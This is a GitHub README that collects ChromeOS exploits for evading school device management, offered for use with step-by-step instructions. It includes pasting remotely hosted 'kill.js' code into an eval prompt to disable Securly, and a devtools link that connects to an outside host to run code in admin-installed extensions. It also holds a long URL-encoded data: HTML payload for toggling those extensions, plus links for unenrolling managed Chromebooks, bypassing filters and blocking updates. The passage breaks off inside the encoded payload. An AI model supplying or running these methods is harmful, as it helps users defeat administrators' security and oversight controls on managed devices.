# EXT-REMOVER
This is a curated list of exploits for ChromeOS. It started with LTBEEF, and now there are more! Some of these exploits can destroy your computer if misused. So PLEASE, PLEASE make sure you follow these instructions very carefully!

<b>Need help? Ask for help <a href="https://github.com/3kh0/ext-remover/discussions">here</a>!</b>

Please use these only when you have permission, I (3kh0) do not condone the use of any exploits for illegal purposes!

<img width="250px" src="https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png">

Image Credit: LittleMissNyan

Thank you to all of the contributors! You all are pretty epic :D

<a href="https://github.com/3kh0/ext-remover/graphs/contributors"><img src="https://contrib.rocks/image?repo=3kh0/ext-remover" /></a>

- [EXT-REMOVER](#ext-remover)
  * [Securly Kill](#securly-kill)
  * [BR1CK](#br1ck)
  * [OlyBmmer](#olybmmer)
  * [Rigtools](#rigtools)
  * [ExtHang3r](#exthang3r)
  * [CryptoSmite *Unenrollment*](#cryptosmite--unenrollment)
  * [SH1MMER *Unenrollment*](#sh1mmer--unenrollment)
  * [Hapara Focus Session Bypass](#hapara-focus-session-bypass)
  * [GuardianTabCrash *Unrestricted browsing*](#guardiantabcrash--unrestricted-browsing)
  * [Skiovox *Unrestricted browsing*](#skiovox--unrestricted-browsing)
  * [LTBEEF *Disable extensions*](#ltbeef--disable-extensions)
  * [LoMoH *Disable extensions*](#lomoh--disable-extensions)
  * [LTMEAT *Disable extensions*](#ltmeat--disable-extensions)
  * [LTMEAT Flood *Freeze extensions*](#ltmeat-flood--freeze-extensions)
  * [Temp TMEAT *Freeze extensions*](#temp-tmeat--freeze-extensions)
  * [Baby LTMEAT *Freeze extensions*](#baby-ltmeat--freeze-extensions)
  * [LTMEAT Print *Freeze extensions*](#ltmeat-print--freeze-extensions)
  * [Dextensify *Freeze extensions*](#dextensify--freeze-extensions)
  * [JPCMG *LTBEEF w/ Service workers*](#jpcmg--ltbeef-w--service-workers)
  * [Corkey *Corrupt extensions*](#corkey--corrupt-extensions)
  * [Extension Launcher *Install extensions w/o allowlist*](#extension-launcher--install-extensions-w-o-allowlist)
  * [Point-Blank *Execute scripts on extension pages*](#point-blank--execute-scripts-on-extension-pages)
  * [UBoss *Tamper with IBoss*](#uboss--tamper-with-iboss)
  * [CAUB *Prevent Updates*](#caub--prevent-updates)
  * [CAUB Flags *Prevent Updates*](#caub-flags--prevent-updates)
  * [Blank3r](#blank3r)
  * [Downgrading *Change versions*](#downgrading--change-versions)
  * [Pollen *Policy Editor*](#pollen--policy-editor)
  * [Killcurly *Break extensions*](#killcurly--break-extensions)
  * [Shimboot *Boot Linux*](#shimboot--boot-linux)
  * [uBlock Run *Run Code On Pages*](#ublock-run--run-code-on-pages)
  * [uRun - Bypass bookmarklet restrictions with uBlock](#urun---bypass-bookmarklet-restrictions-with-ublock)
  * [Quick View *Bypass extensions*](#quick-view--bypass-extensions)
  * [Buypass *Bypass extensions*](#buypass--bypass-extensions)
  * [Chaos *Hapara bypass*](#chaos--hapara-bypass)
  * [SOT Exploit *Open URLs in OneTab*](#sot-exploit--open-urls-in-onetab)
  * [GoGuardian GoAway *GoGuardian bypass*](#goguardian-goaway--goguardian-bypass)
  * [Microsoft Labs](#microsoft-labs--virtualbox-but-it-got-20-doses-of-the-covid-vaccine)

<small><i><a href='http://github.com/3kh0/readme-toc/'>Table of contents generated with readme-toc</a></i></small>

## Securly Kill

You must be able to install ublock origin to do this.
Steps:
1. Install Ublock Origin extension
2. Set up URun
3. Go to https://securly.com and click Ctrl + Shift + ` (It will say blocked but its fine) ## DO NOT CLOSE THE OPENED WINDOW!!!
4. Remove URun and set up UBlock run
5. Copy the code from here: https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/refs/heads/main/kill.js
6. Go back to https://securly.com and click Ctrl + Shift + ` again. The prompt will open in the blocked urun window, but that is how it should work
7. Paste the code you copied into the eval prompt and click enter
8. A big red OFF button should show up. Click off to kill the extension.

## BR1CK

**BR1CK** is an exploit that allows users to unenroll/deprovise managed chromebooks. It currently works on all versions for **CR50s** (ti50 isn't and will not be supported)
for instructions visit: <a href='https://br1ck.vercel.app'>BR1CK's website</a> or visit the repository to download the website's .ZIP <a href='https://github.com/Byteeeeeeee/br1ck'>here</a>

[**🔼 Back to top**](#ext-remover)

## OlyBmmer

**OlyBmmer** is an exploit that allows users to unenroll school-managed Chromebooks. Due to the specificness of this exploit, please visit the linked repository: <a href='https://github.com/BinBashBanana/badrecovery'>OlyBmmer Exploit</a>

[**🔼 Back to top**](#ext-remover)

## Rigtools

**Rigtools** is an exploit that allows users to run code on extensions, disable extensions, and basically do whatever they want with an extension as long as it has the correct permissions. As of October 2024, it is **patched** in Chrome OS 129 and above.

### How do you use it?

1. Open this link and just leave it alone. (Note: This will not run code it's just there to fix the second page.)
```md
devtools://devtools/bundled/devtools_app.html
```
2. Open this link and go to Network

```md
devtools://devtools/bundled/devtools_app.html?experiments=true&ws=rig.kxtz.dev/
```
3. Double-Click the black/grey box:
![image](https://github.com/user-attachments/assets/08996bac-ebc1-4526-973d-ea766731cc9e)
![image](https://github.com/user-attachments/assets/f9ae4b07-d3f3-4318-9d63-404b9142e4f0)

4. Click extension-ID and find your extension-ID.
5. Paste in the extension ID and it should load a filesystem: page. You may have other extensions under it, you can disable those too.


Lastly, You can run code like
```js
alert("hi")
```
so if you have the correct permissions on your extensions manifest file, you can run this code below to run a certain piece of code on any page:
    - tabs
    - activeTab
    - browserAction
    - 'unsafe-eval' set in the CSP (content-security-policy)
If it does not have these permissions, this will not work. (These are in the manifest file.)
```js
chrome.browserAction.onClicked.addListener(() => {chrome.tabs.executeScript(null, {code: `location.href="javascript:replace this part with your own bookmarklet.";`});});
```
and if it works, nice! If it doesn't, then cry in a corner.


Link to repo to self host for new/unofficial ui: https://github.com/Sincereham222/rigtools-newui
Link to repo for official ui: https://github.com/FWSmasher/rigtools

[**🔼 Back to top**](#ext-remover)
## ExtHang3r

**ExtHang3r** is an exploit that allows users to toggle admin-installed extensions on and off. As of October 2024, it remains **unpatched** in Chrome OS 127.

### How do I use it?

1. Copy and open this link and follow the directions:
```
data:text/html;charset=utf-8,%3C!DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%3Ctitle%3EExtHang3r%3C%2Ftitle%3E%0A%20%20%3Clink%20rel%3D%22shortcut%20icon%22%20type%3D%22image%2Fpng%22%20href%3D%22data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAANYAAADWCAYAAACt43wuAAAAAXNSR0IArs4c6QAAIABJREFUeF7tfQl4XEeV7l%2F3qlvyvsryInmJZUu3ZTu2ZSdYJhtDXhIIwxYgMxMcyBuYAfIeBGYeYWbeBHh8kzAPGF4yfJCQkGEJZIMkEEjIQhJiy5Yt2Y4ldcuSl0SSHe92tHer%2B573nSu1LVlL37X7dqvq%2B%2FrrKK46deqv%2Bru2c04JyCQRkAi4joBwXaIUKBGQCEASSw4CiYAHCEhieQCqFCkRkMSSY0Ai4AECklgegCpFSgQkseQYkAh4gIAklgegSpESAUksOQYkAh4gIInlAahSpERAEkuOAYmABwhIYnkAqhQpEZDEkmNAIuABApJYHoAqRUoEJLHkGJAIeICAJJYHoEqREgFJLDkGJAIeICCJ5QGoUqREQBJLjgGJgAcISGJ5AKoUKRGQxJJjQCLgAQKSWB6AOpbINcfWTIn1xgoVRSnWVX0mgDlCFyVCEbMAzNZJXyxIzFQVNQaBeJ6ad0oValxV1HcgEFOEckInvQfAcQj0KHHlaB7yusRkcXTq1Kkdz4nnomlsjqxqHAQksRwMj6WHlxYUoGC%2BCIj5gsQsXejzACxkcggh5hFoERHxfxeCsAhAwG51QggoQoGqqFCFCkVRjL%2BHJiFEJ4AeEDp06F0CokNAvEOgTp30s0IRnQlKnBQQnTr0E3pc78yjvLf1gN6xp3DPUbu6yXIjEZDEsjAqtFbtSghsERDXEGghgAILxT3JahBNUQ2SMdmYdHYTEUWFEGeJ6JgO%2Ffk8yvtVTVHNPrvyJnI5SawUvb%2BqddVyXehbSNAWEJb6fbAIiPOzWZJoTDy7iUBtuq4%2FL3TxVO382hcgkLArayKVk8QapbdXv7V6VkJNfJyItgCoyoUBwTNanpo3sJRUVDABbaR3ALyqk%2F5bVVWfrJlT02FDxoQoYgvdXESmsrYy0L2g%2B3roxlLvAwDyc7Gd3CYmlaqqyFPyjA%2Fv36wmEhSDjlod%2Bm9VXX185%2Fydh63KyOX81hHNMTTK3yqvhAKemW4WEHz4MOFScjZjkjlYNoYTlHhRJfWxnUU7t084EC9q8IQk1sq2lYtUqLcA%2BCSAiok%2BCIa2n0kWzAsioNo%2BwGRxxwG8TDr9em7H3N8%2Ft2LiXQNMKGKVtpRODxQEHgVwHYDhZ9WSXcMQ4OUhk4s%2FFx%2FrW4Sqh4j%2BTKDfT0pMeuz1Ba%2BftFg%2BK7NPHGIRhNau%2FQbAh7KypzKotEGwvICjo%2FzBvV2cQHsC%2FYGbti3c1prBJnle9YQhVnl7%2BdcEiX%2FzHNEcroD3X7xM5L2YkyQgamrm1lRBQHcix89lJwSxtLe0a6HgOQD2L3T83Itp1s2NfRgRfXvXvF13pln1tFWX88TSjmpLkEAd2%2BWlDdUJUlFyH5afZ%2F1mQkDE%2BxP91%2B2ev%2FtPuQhXThOLbfkm5U3aCqAyFzvPL23iJeKkwCQ792FH1KC6ZvuM7Wf80ha39MhpYmlt2kMAbnMLLClnbAR49pocnGznBPEPOwt3vj%2FXsM1ZYpW3lX9WQNyfax3m5%2FawRUdBsMDy4YYO%2FY7awtrv%2B7ltVnXLSWKF2kKXEejPuWyWZLWj05mf91x8emgh9ULHpp1FO9%2BwUMbXWXOOWKVvlxYG4gE%2BrCjxNfI5rhwb%2FPK%2By2wi0P4pXVPWvrrs1T6zZfycL7eIRVDL28tfEBDv8TPoE0U3PpbnpaFZHzFd139WW1R7ay7gk1PE0tq0bwP4X7nQMbnSBt53BQNBBFVTS0NKIHFLXWHdL7O9%2FTlDrPK28o8KiCcMrwiZfIcALw0LAgUp%2FcAIdE6Nq%2Bt2LNjxpu8aYUGh3BiEA3aARwAssNB2mTXNCBhLw0BBStcUItq1q3DXpmz2Vs4JYlW0VmzUhb4zzeNEVmcTATOnhgkkvlNXWPePNqvIeLGcIFaoLfR1At2VcTSlAqYRYGsNnr3Gcklhk6eYHrthT9Gel0wL9VHGnCCW1qbVSrMlH40qk6pwsJspwSnj5X67I9qxuqm46bRJkb7JlvXEKmstW6gIpV0eWvhmTFlShInFBBsrkaA%2F7pq763pLQn2Q2XVibWrcNDsWjH2GiGZzDAkBUUKg2QBmCYgXoOC%2B2tLaBrfarrVpfwvgx27Jk3LSiwA7UfKScLyU0BP%2FUFdU9930auasNleJZZAqEOM18brx1CLQSxC4d3fp7mchQE6aoLVpTwP4oBMZsmzmEOB7rin5U8a3jCecnvPOnEXZFDvDNWKZJdVFXXgAwH0FesHD28q3cXhkS6m0pTQ%2FUBDg9fe4C3VLQmXmtCNg5pRQJ%2F322nm1P0i7cjYrdIVYNkk1VGWOMf4TAXHfrpW7DpltS0VbxfU6dPYMlimLEeCTQZ61xks69EhtYW0oW5rpmFgukGooVjoIv4OK%2F1dXWvdKKhBDbaH7CHR7qnzy3%2F2PABvssnXGeCmux6%2FfXbT7j%2F5vjUPzH5dJNQwvIqom0Of3lO0Z05VAa9cOZ0M89WwYCJnWke%2B12FFy3FmL9Bdr59X%2Bt0zraqZ%2B2zPWZZHL5iTUxIupDirMKDFOnjiAH0DFXXXL6zhu%2BPmktWqrIFDvUL4s7iME8gP5qYx1Ewk9UVZXVHfQR2qPqootYoUaQ1MnBSa9BmB9WhpIOEYK%2FcPuFbsfSdantWlfBXBPWuqXlaQNAT56Hy8Kb0JP%2FLiuqO6zaVPIZkWWifUx%2Bph6qOXQbwG8z2adToq9qgv9Cz0ze9qUPoU9hNc6ESbL%2BhOB8cjFj%2Bh1U%2FfC8Lxwlz%2B1H9DKMrEq91f%2BAAKfz2Cj4vG8eGcsLzbLuvYZ1FpWbQmBScFJY8bO6E%2F0f23P%2FD2%2BXq1YIlbl%2FsovQ8AXN%2BAkCLFADAlVvoNmacRmSebxAtPout5aO692qVPjAi%2BhME2s9fvXf1gI8aSfHhMgEGL5MSQUSS4vB0mmZDO5eOYa7Wmh%2Fv7%2Bm%2FYs3PPrTOmWql5TxNq4fyP7O70KYPzz0FS1efDvTK6%2Bgj7wDJbO1NfQh7MPnwXR8Honb5yMaddNgzpbRrN2oz84XqFBroveVtZ1vbq2qHazG3V4ISMlsdZG1i5VVXUHgCIvFHBDJs9YPHMxydKRevf2ou1v2pDoGH2mFHkCk6smo%2BgbRcgvtR5%2BOR1tyKY6RgsGSiCKR%2BPr9hSPfc%2BZyTamJFbl%2FspaCP%2BHaO7P60d%2FoN9zLPvq%2B9B6c6tBqry8PBQWFp6vMxqN4uzZC7PYjI%2FNwMLvLfRcp1QVDJ1deZDO%2BvQsFKwa36I8lcx0%2FzvrbRjrDjmx0kl%2FqHZeLXs3%2BC6lJlZzJceSyPzoMAFdX34fdMXDl2EIOPz%2Bw2ByManWrVuH6dOnD9Osv78f%2B%2Fbtw7lz5zD9xulY9MNFJjT3Lkvn8514%2BytvD5td1ekqSh4pwaS15uP%2Beaehecn8fBAvC5NJQLxUU1hzrXkJ6ctphlj8aPPS9KlkvybeZzG5vNpvdb7Yifbb2KcSWLNmzbDZaqjW9fX1OHHiREaJFW2J4ugXjxo%2FApySs%2BvJUycR748jW8k11BJeCLGjZm7NJvsjxruSZojVBKDMOxXclcz7rWh%2B1F2hg9KOfe0Yzv7iLCZPnoxNm8buTz8Q6%2BgdR%2FHOkwNWYNOmTYOmacZ3R0cH9uzdc55cix9djILV2bUsZJtCPikUQtTXzK1Z40lnOxRqhlhsBOtL5cdqu1f7rdP3n8aJb50wfv2vvPLKMZ3z%2FECsI587go5nOzBnzhysXTvcQGUouWZ8eAYW3psVK%2F0LS8ALL5sc2lm4c7lDDnhSPCWx1jev3ykgNnpSu0dCeSnYW9DruvTeN3rx5o0DcSQ3btw4Yn%2BVrNBPxJo3bx5Wr149Ags%2F6Oikg3jGmpI%2F5VjNnJqFfrwoTkmsypbKrSD49r5gtM7hAwzea7meEsD%2B1fuhd%2BpYsmQJSktLR1Thl9ngyP84go6nOzBr1iysXz%2FSVnr37t3GCeb0D03Hovsye8Bit5%2BCavDs5QsuL3pAPOD9cbBFJc0Q62UQsuqRgbgaRywYswiFuextn25D10sD9p%2B8Z5k6deqwgkMPBzK5fzn3yDm8fefbxnL1iiuuQCAQOK8nn1y%2B%2FvrrxuX2gnsWYObfzDTXeP%2FlikaKI5OycsZa37L%2BD4LEDf7DdGyN%2BD6L91lepOj%2BKPhgIHnaNlodfjhxS5xJoGV9CyhBWLlyJUpKLrxqdOTIETQ1NUGoAit2r8hqKxHRIfLDFWFvfkUdDCAzM9ZTIHzIQR1pL8rGufE89pH0LvHRe9fzXSNMmvx0Adv6163ofr3bmLWKi4uxfPlynDlzBuFwGPF4HFOumILFv1zsHUhpkEyC5voxoGdqYjVXsnk%2BOxVmTYoGo9LqHUD0QBTtn2pH7K2BH3RVVZFIDJhh8ay6%2BLHFWWeBcfEgpDgta1rW5LuXSVISa2PLxqt0MgxwsybxiaBXl8RZA8KgonqPjpP3nMSZn54BBo1S%2BN5qwbcXZN391WjY69Av3V%2Byf5%2Ff%2BiUlsSprKwOYjpMAZvhN%2BbH06SnoseHCmS2ts6dnT00P3vnNO5j63qmYdu00e0J8WEpX9HfvX7R%2Fm99US0ksVnh98%2FonBcRH%2Fab8aPp4dYeVDW2fiDoqUG5oLGl83m9tN0Wsyv2VfwuRHfHRPbvD8lvPSX0MBIQQHw8Xh%2FklzzHTmvCaVT2BnpYDKw54Y%2Bs2Ss2miHV5y%2BXFcYq32omRke7%2BZ1d9PryQaYIgIHBHpDjy%2FaGtXR1ZvZp0uhrAVQD4ew4IR4QQ9%2FQGe3%2BcDoKZIhYrXdlcmRU2g3zMzsftMk0MBIjofr1X%2F5dgPPhXELgaZJBpzlitFxBHAdztNcGsECsrjt29vByeGEM1u1opdLFL6VLmAVhiRXMmGIHu6Qv2PeDFDGaaWBuaNmwmhbZaUT4TeeUdViZQz0ydIi6g9CockcH0OL5YU68IZkmhypbK74DwlczAaK5WDiyjCw%2B9iM2pIXN5jICICYg%2BdtS3NITH1IoJlkDiE%2BGKsCuThyWtOAru4ebDz5Ig3z5dKS%2BHPR7RGRZvUKlXQPRbGrqmtCbQc40Vja5EeLas3drDa2eq%2FUbUJl96FfdM6jEFosyUnQgoPQp4CehRSujQLwlXhPkE3FGypeFlkctWJtREDQBf%2BRvIy2FHY8HXhQUJKN3KebMsr5Ql0DcbKxrvcirfFrG40vUt668TJH7P9pxOlXCrvJfxLtzS0VM5OsChzrq3dyPWEsOsT2VfmLPR8DEOKfq8J9Vg3e1aSFv6hHjCUXhl28RiJTa0bLiDiL7n6WCxIHyi3WElTifQu6cXfY19xjfbA%2BpdFw5u%2FOAXZqH7Rs3KeymlV3Eqxlp5HR9oWN3wrLVCw3M7IhaLqmyufBjAp5wo4VbZdPhhuaWrFTkUI8MFJHYwhr5wH2LNMfTu60X82Og%2BZxzshr2D2UXEcA95fDEKKrIrEhNb4vMs5eF%2Barwu%2BF1DRcNfWumji%2FM6Jha%2FXD9dn%2F4nIUSVE0WcljX2V%2Fm9vrFqjzZHcebBM6D48LDXeUV5KAgVILg8aISfFsELXTCCQC0xRA8OEGq86Nn5%2BflGYJuZM2caHw4Z0NnZidraWoNgs26Zhfl3z3cKcXrKE6DEFIio46HpRN%2B4mqcufaPsDQ5Wayu5ov3Gwxvn6%2F36TgAX%2FL9tqWOzkAD6gh5HwbWiGkfMveGwsUQbNwkYBMubl4fE8QSih6LjEohlTZkyxYhryOThDxMqGAyOqObUqVN4442B55uLf1Lsf1cRJlT%2FIKHSE4J%2F%2FK4h8a%2F1q%2Br%2Fj5VuH5rXFWKxwHVN6zYoisJ%2BMSN72a52Jst5FUfQZPUjsg2NmMux3Xlpxond4Xt6etDd3Z1SdJJA%2FM0Ba5J%2FK4q5%2FcbOnTuNWYudGpf9fplvZvKxGs4zlBI117aU4LmT4a2GUMMlEEn3UGtCXSMWV7uhecM%2FE%2Bhb1lRwlttwEwn2%2BWrgHPunYzj787OYNGkSqqpGrpB1XT9PsK6uLvBjCrycs0Og0dDLutmK3SYycUiRYugR6IbGCnu%2BXq4Sa%2FB9Yp61LndGF%2FOlPX8Iwbwq53Oe%2BckZHL%2FrOHh2ueqqq4zvdKZsm60MbHRA7fLNzc1Adwn8piHUYMvB11ViGbNW04YyUmgPAM%2BfsuDYgRxD0G8pdjiGg1ceNNTi8M4c5jldKRtnqyQ2aqeaco%2BZLhwH6%2BnXoS8OV4SPWa3XdWKxApXNlV8EMMz5zKpiqfL73aHx4BUHEXszZsTz47h%2B6UpZOVsNgqP2qID%2Ffif%2FqaGi4W6r%2FecJsdiMv7K58mUIXGNVITP5vX6ux4wOqfIc%2F9fjOPPwmTH3WanK2%2Fn3bJ6tjJVXbNDCwk7jvStzsCHUsMJqtF1viMWnhIfWLVHiCoelGv4ymwsAZIPPVdcrXWjb0ma0lp%2F84SNyr9PevXtx%2BvRpI1bgsj%2F4%2FyTwYjxEYtAe0GugrMk%2F1FDRYPlFE8%2BIxbpvaNlwGxE9ZK0d4%2BfOFrMl6iPjAQX%2BvjjEs5t4JGXxSeNrr70G%2Fua3j2ffNtuLaryVSYCxz%2FJXurehooG3NpaSp8RiTSqbK38H4EZLWo2R2VgCFvSl7RFvpzq3fbINXa92GS8%2F8guQXiaeqXjG4rT8z8sRXJb260RXmqd0KRC658PStK5CiGvrQ%2FUvmS4wmNHzFrBVRiKeeFOQcPR8PPtf80uNnr4xbBW9FPlP%2FvtJnLrvVMoXIN2otrm5GW1tbQguDmL5NssrFzdUcEUGG9x64cRoU7kOHXqhnUcXPCcWN2jNW2ua82J5K9inxm7ym3WFmXbw%2B1T8ThU%2FSnD11Vd7ep9VXV2N3t5ezP70bBR9s8iMer7M47MDjCcaKho%2Bbgco%2ByPdQm1am8aP4U5nQ1JVV6HoyvlvM2KyNQgnW6Ifvo7fRgcuv%2FzyEW9pmWm7mTxsJrV9%2B3Yja8nPSjD1muFvdpmR4Zs8CUDt9sc%2BiwTd2hhq%2FJkdbDwn1sq2lYtUqANPzY%2BS1IR6nmRMuIuTsQQsiGZlgBiKEprKmoAEUFFRgfnzvbEw5yUgLwWVfAUrG1ZCFHjerXbGmukyaocviJWI5cXmN5c1nzKt%2BJCMnvdAqD30F0RkavPHgUKUxIXZTCHFeEDOq0fk7ABmtczBqw4idiiGpUuXGu9TeZH27duHkydPYurVU1Hy88w4GLjZLmPGcuS%2F64o22xoqGt5tV5LnxNJatS9A4D9tKcjuA55raEsz04XaP9OOzuc7MXv2bKxbt850OSsZt27dahjyFn6lEHO%2FNNdKUV%2FmNRwcY5nteEHizvpV9d%2B2C5Dn2ofaQvcR6Ha7CmZ7ufHeAnajbbFYzHhPmFPJT0sw9T1ZvL8aBMQXlu46Qg2rGyJ2%2B8hzYmmt2osQeK9dBbO9nPEWcGWL4UlcXl6ORYvcfaF%2B6P3Vij0rkDd3wPcrm1OGLTB4nfSlhoqGe51g6DmxytvK2wREsRMls71s8i1gL5aDhw8fxqFDhxBYEEDpztJsh%2Bq8%2FhmydOdg1V9oCDX80CmQnhKr7GTZNKVP4aN2T%2BtxCoLX5b1cDiat2addNw3FD%2BbO71cGloM6Cfq7xlDjg26MB08HfFlr2QZFKLvcUDSbZRjLwfUtoIS7y8Fst2ZP1accm50Dy6QhJYjovzeuavypW3V5SqxQW%2BgWAv3cLWWzWU5yOcixK%2FiymK0xnKZs9r0y2%2FY0HL3HBcSt9RX1vzSrk5l8znt3nFq0du1bIPyzGUVyPU%2F31m60%2FtVASPDS0lIsWWLpOacR8PC9Fd9fccqKKEx2O5jjC3YrcGION07VTKq%2Frq%2BoH%2FepVTuqe0qsUFvoSQLZihlgpzF%2BL3Pkc0fQ8WwHVFU1fLQ4gIydxIE4a2pqDNvAbInCZKed58vEAeMxBHe36jEI3NwQanjKkW5jFPaUWFqb1gCgwgvFs1Fm%2F9v9OHTVIei9OoqKirBq1SpbzUhaskMBljy%2BBJMv996J0paiLhZy2Tg3Ch03OQ0jPV7zvCMWQdXaNX5TJzsdg1wcFENFnf7haZz4txPG%2F2JLDD6Ct5L4wIKXgBzhNtst2a20m%2FO65FLSS6CP2A1rZlZnz4iltWkrADSbVWSi5OOL4sPvPWyEjrZyr8XLv4MHD6K9vd0gVXBJEMteWAZlclpOzfzRPewdwXaE9h%2Fs7BFCfNCO46JVADwjVvmR8g8IXfzWqkITIb%2FVey2epXj5x3sqTkyqRQ8sMmLAT7RkWGX0KHbCpHUJRdxYr9W%2Flg7MPCOW1qb9I4B%2FT0cjsq2OoWZOixcvNizfA4HAiGYwodiqgkNFG0kBZt86G4V3Fk6smeoiZGxcHp9WhHLjvtA%2Bfok0LckzYpW3l%2F%2BXIHFrWlqRhZUk77VYdb7TmjVr1rBTwq7uLnR2DBIKME7%2Fiu4qmhAHFWa604IFfKtIiOvq19Q3mZHrVh5PiFW2tWyaMls5jGlIXwhYtxBJk5zo%2FiiOf%2BM4erb3jHjqZ6gKTKi5d8z1%2F2shacItWY3hu8dLwvEDfDaoeer1Tp7jsdssT4ilVWsPQcVtWDDRrQRTdwsvCzv%2F2ImeXcMfJedZbOr1UyWhxoNwnMMMUuhMoC%2BwfO%2B6vedS94L7OVwnllatfRjAbwxV%2Benvae4rLSVKBM4jMEqMDMoj6JP0cGRxJGN3qK4SS%2FuztgAq9kFgwI2VQxcslINAIuAtAkMvjylIoAKOlEJdkZJIxn7W3SMWQZRvL%2F%2BDgLh%2BGIx8%2FznFW2CldIkAXx6TQqD8C89BJtREYfNCe8FgnCLqGrHKq8tvFxD3jVCIHVo5OJFrNTltsiw%2FURAgnTY0LWmqy0R7XRnuq7av0hKU4AaM%2FiYWnw3mvjlbJvpP1jkOAmwA3lTSNLDfT3NyTKzK2spAT6yHL97Wj6k73316E1IvzXDJ6rIKAYEvR4oj%2F5EJnR0TK1QduptAd6ZUno8zPH%2FjMaUWMsMEQoBA9zaVNFl%2BKcQNiBwRK7Q1dAUp9Mrg%2Bd%2F4%2BrDr0Tw3VJYyJAKmEXgmUhL5kOncLma0TazSHaXTA3rgDQBLTetTyLY5pnPLjBIBRwgQ6I2mkqa1joTYLGybWOXbyz8gyKL1OpOKySWTRCA9CJyLlERmpaeq4bXYJpZWrX0BsBE6ml%2BYka6PmejrCVlnfjx%2F1t5l6TdrckIsdglh1xBrSc5a1vCSuR0hoAhlbWNxI29Z0prsE2ub9igEPmFLWz56H%2Bl%2BZEuULCQRGA8BhZQPNi5uTLvDrX1iVWvV%2FCC8rW7ly2LpUGILOlnIGgIC4n%2BGS8IjLYKsibGc2wmx%2BDE5exH%2BuVaetbI%2Ffr9lwGWB9CIghPheuDj8lfTWatOCb9Daom%2FAWdxmYsNcawGKbFYki01kBATEr8Ml4ZvSjYGtGauspmyZklAOOVZWnhA6hlAKSIlAbaQksjFlLpcz2CJWxesVl%2BqqvtexLtIawzGEUkBKBFoiJZGVKXO5nMEWsVgHbZv2OgRsv9F6vh3ShtDlLpXiLkKgNVIScRYo3waktolVtrXsGkVR%2FmSjzuFF%2BACDY2PIJBHwAgGB45HiSNp9K2wTizEIbQ%2F9iYiucYyHjI3hGEIpYEwEMmLW5IhYZdvLNiukbHXcqXy2yLOW%2FTNGxypIATmLQG%2BkJJJ2N1tHxDJmrerQ8wS6znG3cNgPnrlkkgi4i4AeKYlwWKO0JjeIdRmB2IPYsSxj1pKXxmkdABOhssnHJwfrNtT1p7OtzsnAJ4TV2u8A3OhYcWmg6xhCKWAkAiJfTAvPC3elExt3iLVdWw9CrSuzlnSGTGf%2FT4i6SNDcpuKm0%2BlsrCvEYoW1ao2j4XAUXGeJfbXYIkMmiYBLCIgT4u%2FDleH7XRJnSoxrxCqvLl8tINgaw%2FnZngzyaarzZCaTCBwFkECtgLgzXBV%2B2WQpR9lcI9bgrPUYgI870ogL8xmOfFDBMYxSwCACxwAkjy4IL0LBnZFNkd1e4uMusXZoK5DAyxAocaz0dAAzHEuRAiQCwHEQYsNOrQkCjymk%2FO%2FGqsYDXkDkKrFYwbWvrJ0ZDUZ%2FZNu7ONlK1oxnrbTfQHgBs5SZUQSOA4iNqkE%2FCA%2BKgPhm%2BLIwz2uuJdeJldQstC10Cwn6T0fzDgf4HHi3RCaJgH0ETgCIjlu8G4TvR%2FOj%2F%2FfQhkPv2K%2FoQknPiMVVaNs0tir%2BhSMreF4O8rJQJomAXQROAmC33NTpuUhV5H2ps6XO4SmxjOofhxoqCX2ViL5uO4SMvNtK3ZMyx9gInALQaxIggZsjmyJ8COcoeU%2BsQfXKtpZtUITyCASsO53xAT7fbUlzJ0edPWELWyEWcCw%2Fmq%2FtvcZZLMK0EYs7dc0ba6bEumPfFRB%2FZ7mT%2BeKYY7%2BnVWPLWsoCfkOADy14KaibV4xA9zdVNf29%2BRIjc2ZkmA6Gp37IcsBpGTbNSV9PvLI2SMUgCYhD4arwcieAZYRYrPCqHauKEpT4CQjWNovSKdJJf0%2BcsnwhzKeBFmaqIeDURaoiG5yAlTFiJZUObQt9lwR92XQjWGM%2BzOBANDJJBEZDID5IqoRteF6KVEWutV3aDzuWFa%2BvuCRPzTtoqRF8mMFRDOTlsSXYJkRm56RimB6PVEXshU8fBDnjMxbroVVrHLR%2BjaWOl4cZluCaEJl5hmIrC%2FszlQFT1h5eXNzJoW2hr5Oguyx3%2FlQAGXn9yLKmsoDXCLhEKlZTQNwTrgp%2FzYnKvpixQttCa0nQHlsNkS4mtmDLqUJMKj6o4GWgG0ngq5FNEX6mynbyBbEGl4OHLT27mmwyt4Dvt%2BRjdrYHQdYWZCL1AOh2kVS8FCT6bNPmph87wcVPxPoPAF%2By1Rg%2BxGDLDHmYYQu%2BrCrEsxOTiT%2BjW6w7bg4R3dS0uenXTgT5hljl1eVXCYhXbTeGj9%2F5GN43LbLdElnwYgT4Lopt%2FZhM5oxpHWGokPIXjZsbHUV59s8wfByqVqy9bdkaYyiEMjahowHlq8J0EZn47%2FSkqAJlYWNV4xkn1fmHWAPH7rsAOLrxNl6KTHvcUyddIMueR4CoF6K4AAAGLElEQVTJw35TPDPxDGXPasIpoE9FqiIfcSrEV8Qqry5vExDFThtlWGUwudhRUu67HMPpuQDeK%2FEBBJPJ4R2UC7p%2BJFIVecqpHP8QiyC07RqvoN073%2BPWJUnGRPNPa532W%2FaXZ1u%2B5CGEW8fkzlE5I2aIBeGKsONjEd8MtYrqitk6dO%2BCKnJLeQZLzmTOO0FKsIpA8kSPZ6e0Bnw2reiPIlWRz5nOPU5G3xBr1fZVWoISYTcalVIG2xoywfjjV2Ne3m8k9xhDf9F5aZtNDp%2BsO69DeHYaP%2B5Eym7zOgOBNjdVNVW7UY9viOXaQ3ZWUeGBmiSZe4vQC3sF%2FpVmkiT3DvzNhEkSJ%2FlvF%2BdJ1Q7%2BcWCC8Wfofyf%2FztTektvHROIPL6j8s8xLhejBSFWkNFUms%2F%2FuG2Jp27SbIfArs4p7ki8AYMrgkpGRYQIkP0kiJIly8WySHEBJ0niioAWhrP9opGPCJT9u9D63l0nEsxF%2F%2FLnESwmcIPGN8OYwx2VxJbkBrSuKaNXaFwF83xVhUog5BJLLyiTRmIhD%2F3u0YOFMJCZQckZyvM03p6rHuUiBstLN4J2%2BIVaoOnQ3ge70GEAp3